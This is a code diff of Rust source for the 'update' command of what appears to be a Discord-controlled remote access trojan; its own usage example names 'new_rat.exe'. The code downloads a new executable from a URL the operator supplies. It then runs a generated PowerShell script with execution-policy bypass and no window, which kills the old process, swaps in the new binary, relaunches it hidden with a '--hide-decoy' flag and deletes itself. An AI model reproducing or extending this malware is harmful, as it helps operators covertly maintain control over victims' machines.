@@ -7,6 +7,7 @@ use std::fs;
 use std::os::windows::process::CommandExt;
 use std::path::{Path, PathBuf};
 use std::process;
+use std::sync::Arc;
 use twilight_http::Client as HttpClient;
 use twilight_model::channel::message::Message;
 
@@ -15,7 +16,7 @@ pub struct UpdateCommand;
 #[async_trait]
 impl BotCommand for UpdateCommand {
     fn name(&self) -> &str { "update" }
-    fn description(&self) -> &str { "Update the bot from an attachment or URL, now with more power" }
+    fn description(&self) -> &str { "Update the bot from an attachment or URL" }
     fn category(&self) -> &str { "system" }
     fn usage(&self) -> &str { ".update <url> | .update (with attachment)" }
     fn examples(&self) -> &'static [&'static str] { &[".update https://example.com/new_rat.exe"] }
@@ -69,7 +70,6 @@ impl UpdateCommand {
             .model()
             .await?;
 
-        // dwnload
         let resp = reqwest::get(url).await.context("Failed to download file")?;
         if !resp.status().is_success() {
             http.update_message(status_msg.channel_id, status_msg.id)
@@ -78,8 +78,6 @@ impl UpdateCommand {
             return Ok(());
         }
         let bytes = resp.bytes().await.context("Cant read file bytes")?;
-
-        // do upd
         self.do_upd(bytes.to_vec())?;
 
         http.update_message(status_msg.channel_id, status_msg.id)
@@ -99,25 +97,20 @@ impl UpdateCommand {
             .to_string();
 
         let install_dir = self.get_inst_path().context("Couldnt determine install path")?;
-        fs::create_dir_all(&install_dir).ok(); // ensure dir exists
+        fs::create_dir_all(&install_dir).ok();
 
         let new_exe_path = install_dir.join("kurinium_upd.exe");
         fs::write(&new_exe_path, new_exe_bytes).context("Cant write new exe")?;
 
         let script_content = self.gen_ps_script(&curr_exe_path, &new_exe_path, &final_exe_name)?;
         let script_path = install_dir.join("k_update.ps1");
-
         fs::write(&script_path, script_content).context("Cant create update script")?;
 
-        // run script detached n hidden
         process::Command::new("powershell.exe")
             .args([
-                "-ExecutionPolicy",
-                "Bypass",
-                "-WindowStyle",
-                "Hidden",
-                "-File",
-                &script_path.to_string_lossy(),
+                "-ExecutionPolicy", "Bypass",
+                "-NoProfile",
+                "-File", &script_path.to_string_lossy(),
             ])
             .creation_flags(0x08000000) // CREATE_NO_WINDOW
             .spawn()
@@ -128,71 +121,33 @@ impl UpdateCommand {
 
     fn gen_ps_script(&self, old_exe: &Path, new_exe: &Path, final_exe_name: &str) -> Result<String> {
         let old_exe_path_str = old_exe.to_string_lossy().replace("'", "''");
-        let old_exe_name_no_ext = old_exe.file_stem().context("cant get stem")?.to_string_lossy();
-        let install_dir_str = old_exe.parent().context("cant find parent")?.to_string_lossy();
         let new_exe_path_str = new_exe.to_string_lossy().replace("'", "''");
         let final_exe_path_str = new_exe.with_file_name(final_exe_name).to_string_lossy().replace("'", "''");
-        let backup_exe_path_str = new_exe.with_file_name(format!("backup_{}", final_exe_name)).to_string_lossy().replace("'", "''");
 
         let script = format!(
             r#"
-$ErrorActionPreference = 'SilentlyContinue'
-Start-Sleep -Seconds 3
+$ErrorActionPreference = 'Stop'
 
-$old_process_name = '{old_name}'
 $old_exe = '{old_path}'
 $new_exe = '{new_path}'
 $final_exe = '{final_path}'
-$backup_exe = '{backup_path}'
-
-Get-Process | Where-Object {{ $_.Name -eq $old_process_name }} | Stop-Process -Force
+Get-Process | Where-Object {{ $_.Path -eq $old_exe }} | Stop-Process -Force
 Start-Sleep -Seconds 2
 
 if (Test-Path $old_exe) {{
-    Copy-Item -Path $old_exe -Destination $backup_exe -Force
+    Remove-Item -Path $old_exe -Force
 }}
 
-Remove-Item -Path $old_exe -Force
-Start-Sleep -Seconds 1
+Move-Item -Path $new_exe -Destination $final_exe -Force
 
-if (Test-Path $new_exe) {{
-    Move-Item -Path $new_exe -Destination $final_exe -Force
-}}
-Start-Sleep -Seconds 1
+Start-Process -FilePath $final_exe -ArgumentList '--hide-decoy' -WindowStyle Hidden
 
-if (-not (Test-Path $final_exe) -and (Test-Path $new_exe)) {{
-    robocopy "{install_dir}" "{install_dir}" (Split-Path $new_exe -Leaf) /MOV /R:1 /W:1
-}}
-
-if (Test-Path $final_exe) {{
-    Start-Process -FilePath $final_exe -ArgumentList '--hide-decoy' -WindowStyle Hidden
-    Start-Sleep -Seconds 3
-
-    $new_process = Get-Process | Where-Object {{ $_.Path -eq $final_exe }}
-    if ($new_process) {{
-        Remove-Item -Path $backup_exe -Force
-    }} else {{
-        if (Test-Path $backup_exe) {{
-            Copy-Item -Path $backup_exe -Destination $final_exe -Force
-            Start-Process -FilePath $final_exe -WindowStyle Hidden
-        }}
-    }}
-}} else {{
-    if (Test-Path $backup_exe) {{
-        Copy-Item -Path $backup_exe -Destination $old_exe -Force
-        Start-Process -FilePath $old_exe -WindowStyle Hidden
-    }}
-}}
-
-Start-Sleep -Seconds 5
+Start-Sleep -Seconds 3
 Remove-Item $MyInvocation.MyCommand.Path -Force
 "#,
-            old_name = old_exe_name_no_ext,
             old_path = old_exe_path_str,
             new_path = new_exe_path_str,
             final_path = final_exe_path_str,
-            backup_path = backup_exe_path_str,
-            install_dir = install_dir_str,
         );
 
         Ok(script)
